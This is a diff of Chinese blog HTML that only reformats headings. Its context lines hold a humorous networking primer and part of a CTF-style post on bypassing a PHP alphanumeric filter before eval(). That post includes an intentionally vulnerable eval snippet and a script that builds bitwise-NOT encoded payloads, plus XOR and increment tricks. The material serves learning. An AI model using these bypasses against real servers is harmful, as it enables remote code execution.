@@ -141,7 +141,7 @@
 
 <p><a href="https://mp.weixin.qq.com/s/jiPMUk6zUdOY6eKxAjNDbQ">如果让你来设计网络</a>这篇文章是写得真的十分清楚，是超赞的入门基础篇，为这篇水文（悲）提供了大量的资料和指导。</p>
 <p>真的十分感谢原作者呀！</p>
-<h1 id="Hub-集线器"><a href="#Hub-集线器" class="headerlink" title="Hub/集线器"></a>Hub/集线器</h1><p>在它被应用之前，两台计算机<del>为了分享黄油合集</del>要建立通信，就得用网线直接将它们相连，其实貌似也只有这种办法了。</p>
+<h1><span id="hub集线器">Hub/集线器</span></h1><p>在它被应用之前，两台计算机<del>为了分享黄油合集</del>要建立通信，就得用网线直接将它们相连，其实貌似也只有这种办法了。</p>
 <p>很快，更多的绅士们找到了黄油的来源，然后互相连起了网线，交流游van心door。</p>
 <p>随着加入战斗的绅士越来越多，大家发现身上的网口开得实在有点多了，线也交错在一起，根本不好维护。</p>
 <p><img src="/images/BUU/202203162155624.png"></p>
@@ -151,7 +151,7 @@
 <p>大家仅需把网线连在它的身上就好，随着网口和网线数量的减少，一切都变得有序了起来。</p>
 <p>这个设备的工作只是负责转发，将收到的数据包<strong>广播</strong>给所有出口，仅此而已。</p>
 <p>所以，为了让其余计算机得知发来的数据包究竟是不是自己该收下的那个，我们还需要一个身份证。</p>
-<h1 id="Media-Access-Control-物理地址"><a href="#Media-Access-Control-物理地址" class="headerlink" title="Media Access Control/物理地址"></a>Media Access Control/物理地址</h1><p>也叫MAC地址，<strong>全球唯一</strong>。大概长<em>00:0C:29:CA:E4:66</em>这样，由网络设备制造商生产时烧录在网卡里。</p>
+<h1><span id="media-access-control物理地址">Media Access Control/物理地址</span></h1><p>也叫MAC地址，<strong>全球唯一</strong>。大概长<em>00:0C:29:CA:E4:66</em>这样，由网络设备制造商生产时烧录在网卡里。</p>
 <blockquote>
 <p>硬件的MAC地址是厂家按照一定的规则，进行设置所产生的，因此，MAC地址拥有自己的格式。</p>
 <p>MAC 地址采用十六进制数表示，共 6 个字节（48 位），长度为 48bit（字节）。整个地址可以分为前 24 位和后 24 位，代表不同的含义。</p>
@@ -163,7 +163,7 @@
 <p>其余计算机收到数据包后，根据头部的MAC地址信息，判断是否确实是发给自己的，就可以选择是<strong>收下</strong>还是<strong>丢弃</strong>了。</p>
 <p>虽然集线器使整个布局干净不少，但原来只发给某台计算机的消息，现在却要发给连接到集线器中的所有设备，来，騙！（指大量垃圾数据包），来，偷袭！（指占用过多带宽）这好吗？这不好。更重要的是，这并不安全。</p>
 <p>我劝！这位年轻集线器，耗子尾汁。</p>
-<h1 id="Switch-交换机"><a href="#Switch-交换机" class="headerlink" title="Switch/交换机"></a>Switch/交换机</h1><p>要是集线器再智能一点，只会发包给目标MAC地址指向的那台计算机就又能解决大部分问题了。于是勇士们又发明了<strong>交换机</strong>。</p>
+<h1><span id="switch交换机">Switch/交换机</span></h1><p>要是集线器再智能一点，只会发包给目标MAC地址指向的那台计算机就又能解决大部分问题了。于是勇士们又发明了<strong>交换机</strong>。</p>
 <p>交换机内部维护一张MAC地址表，记录着每一个MAC地址的设备，连接在其哪一个端口上。</p>
 <p><img src="/images/BUU/202203162156314.png"></p>
 <p>嘛，最开始的时候这张表必定是空的，这恒河里。但它逐步建立的过程也很好理解。</p>
@@ -181,14 +181,14 @@
 <p>最终，两个交换机将分别记录 A ~ H 所有机器的映射记录。</p>
 <p><img src="/images/BUU/202203162200467.png"></p>
 <p>这种设计在局域网内有几十甚至几百台电脑的时候，都能很好地工作，所以这种基于交换机的网络设计模式，支撑了好一阵子。</p>
-<h1 id="Router-路由器"><a href="#Router-路由器" class="headerlink" title="Router/路由器"></a>Router/路由器</h1><p>但谁都没有想到，计算机在地球上的发展速度实在是太快，太快。数量很快就到了几万、几十万、几百万，交换机的地址表已经无法记录如此庞大的映射关系了。</p>
+<h1><span id="router路由器">Router/路由器</span></h1><p>但谁都没有想到，计算机在地球上的发展速度实在是太快，太快。数量很快就到了几万、几十万、几百万，交换机的地址表已经无法记录如此庞大的映射关系了。</p>
 <p>很明显，问题就在于一台交换机连到另一台交换机上的那根线。千千万万个设备连接在一起，使地址表逐渐大得离谱。我们需要另增一个设备再次帮忙作转发。</p>
 <p>这个设备就是路由器。作为一台每个端口都独立拥有MAC地址的设备，会帮我们把数据包再做一次转发。</p>
 <p><img src="/images/BUU/202203162203659.png"></p>
 <p>但是，现在我们想从主机A给主机C发送数据，单靠MAC地址的话，似乎不太行的通了。</p>
 <p>因为交换机的工作仅着眼于MAC地址，一查地址表没有，广播后更是没有回应，它就光速进行一个班的下，表示我什么都做不到（指把包原封不动地还给你）。</p>
 <p>这我们还指望路由器帮忙转发呢，看来得提前让主机自己判断一下，目标跟自己是不是在同一台交换机下才行。</p>
-<h1 id="IP-互联网协议地址"><a href="#IP-互联网协议地址" class="headerlink" title="IP/互联网协议地址"></a>IP/互联网协议地址</h1><blockquote>
+<h1><span id="ip互联网协议地址">IP/互联网协议地址</span></h1><blockquote>
 <p>于是你发明了一个新的地址，给每一台机器一个 32 位的编号，如：</p>
 <p>11000000101010000000000000000001</p>
 <p>你觉得有些不清晰，于是把它分成四个部分，中间用点相连。</p>
@@ -205,7 +205,7 @@
 <p>这样一来，数据包的头部就被拼上了路由器的MAC地址。</p>
 <p>现在两个设备之间的数据传输，得再加上一个头部了。</p>
 <p><img src="/images/BUU/202203162205057.png"></p>
-<h1 id="Subnet-子网-Subnet-Mask-子网掩码"><a href="#Subnet-子网-Subnet-Mask-子网掩码" class="headerlink" title="Subnet/子网 Subnet Mask/子网掩码"></a>Subnet/子网 Subnet Mask/子网掩码</h1><p>刚刚我们提到，<em>只要目标IP地址不为192.168.0开头</em>，其实就是在判断目标主机是否和自己在同一个<strong>子网</strong>下。</p>
+<h1><span id="subnet子网-subnet-mask子网掩码">Subnet/子网 Subnet Mask/子网掩码</span></h1><p>刚刚我们提到，<em>只要目标IP地址不为192.168.0开头</em>，其实就是在判断目标主机是否和自己在同一个<strong>子网</strong>下。</p>
 <p>子网的划分是人为规定的，目的是将物理网络重构为逻辑网络，方便管理和提高安全性。</p>
 <p>那对于计算机来说，就是通过<strong>子网掩码</strong>来做出判断的。</p>
 <p>拿最常见的例子，<em>255.255.255.0</em>来说，即表示前24位正是子网所在的网段。</p>
@@ -218,7 +218,7 @@
 <p>对 A 来说，A 只能直接把包发给同处于一个子网下的某个 IP 上，所以发给路由器还是发给某个电脑，对 A 来说也不关心，只要这个设备有个 IP 地址就行。</p>
 <p>所以默认网关，就是 A 在自己电脑里配置的一个 IP 地址，以便在发给不同子网的机器时，发给这个 IP 地址。</p>
 </blockquote>
-<h1 id="Routing-Table-路由表"><a href="#Routing-Table-路由表" class="headerlink" title="Routing Table/路由表"></a>Routing Table/路由表</h1><blockquote>
+<h1><span id="routing-table路由表">Routing Table/路由表</span></h1><blockquote>
 <p>路由器收到的数据包有目的 IP 也就是 C 的 IP 地址，需要转化成从自己的哪个端口出去，很容易想到，应该有个表，就像 MAC 地址表一样。</p>
 <p>这个表就叫路由表。</p>
 <p>不同于 MAC 地址表的是，路由表并不是一对一这种明确关系。</p>
@@ -227,7 +227,7 @@
 <p>路由表就表示，192.168.0这个网段的，都转发到0号端口，192.168.1这个网段的，都转发到1号端口。</p>
 <p>但路由表的生成可不像MAC表那么简单的说，它是由复杂的<a href="https://www.jianshu.com/p/cf74e5eab2c7">路由算法</a>生成的。</p>
 <p>这里还有一列叫做<strong>下一跳</strong>的数据，这是在路由器连接到另一台路由器上时存在的。</p>
-<h1 id="Address-Resolution-Protocol-地址解析协议"><a href="#Address-Resolution-Protocol-地址解析协议" class="headerlink" title="Address Resolution Protocol/地址解析协议"></a>Address Resolution Protocol/地址解析协议</h1><p>那现在假设我们的数据包经过重重转乘，终于来到了海的那边（指另一个子网），作为一名初来乍到的数据，它是怎么知道目标IP的MAC地址，从而通过交换机发过去的呢？</p>
+<h1><span id="address-resolution-protocol地址解析协议">Address Resolution Protocol/地址解析协议</span></h1><p>那现在假设我们的数据包经过重重转乘，终于来到了海的那边（指另一个子网），作为一名初来乍到的数据，它是怎么知道目标IP的MAC地址，从而通过交换机发过去的呢？</p>
 <p>故技重施嘛，我们的电脑里还存在一张缓存表，表中记录着IP与MAC地址的映射关系，这就是<strong>ARP协议</strong>用到的的<strong>ARP协议缓存表</strong>。</p>
 <blockquote>
 <p>A封装好要发送的信息，在要写“收件地址”时，A会用子网掩码进行计算先判断C和A自己在不在同一个网段，这时候A知道了C和自己不在一个网段，</p>
@@ -260,7 +260,7 @@
 <p>本地写个青春版</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
 
-<h1 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h1><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p>
+<h1><span id="取反">取反</span></h1><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p>
 <p>举个栗子</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(~<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(-234)</span></span><br></pre></td></tr></table></figure>
 
@@ -281,7 +281,7 @@
 <p>试着写了个很挫的脚本 学习为主 轻喷（demo版 后面会继续升级的 这还不够智能 瘫</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn($func1 [, $func2] [, $param])</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;ini_get&#x27;</span>, <span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$func1</span>, <span class="variable">$func2</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$param</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$negat_func1</span> = ~<span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)());&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$negat_param</span> = ~<span class="variable">$param</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;)));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>万恶之源 我很异或（疑惑）的出处</p>
+<h1><span id="异或">异或</span></h1><p>万恶之源 我很异或（疑惑）的出处</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">1</span>;  <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">0</span>;  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">0</span>^<span class="number">0</span>;  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
 
 <p>在php中两个字符串异或之后，得到的还是一个字符串。基于此我们也能做到无字母数字构造payload。</p>
@@ -292,7 +292,7 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># @</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># a</span></span><br></pre></td></tr></table></figure>
 
 <p>（脚本绝赞升级中）</p>
-<h1 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h1><p>php的字符自增和C的ASCII值自增有很大不同。</p>
+<h1><span id="自增">自增</span></h1><p>php的字符自增和C的ASCII值自增有很大不同。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># aa</span></span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># ab</span></span><br></pre></td></tr></table></figure>
 
 <p>同时我们要注意字符变量只能递增，不能递减，且只支持纯字母（a-z 和 A-Z），递增或递减其他字符变量是没有用的哦。</p>
